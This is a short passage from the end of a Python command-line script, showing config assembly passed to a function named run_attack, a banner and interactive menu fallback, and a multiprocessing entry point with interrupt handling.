            "down": args.down,
            "check": args.check,
            "check_to": args.check_to,
            "check_w": args.check_w,
            "top": args.top,
        }
        return run_attack(cfg)

    print_banner()
    try:
        return interactive_cli()
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        return 130


if __name__ == "__main__":
    try:
        mp.freeze_support()  # Windows fix for multiprocessing
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        sys.exit(130)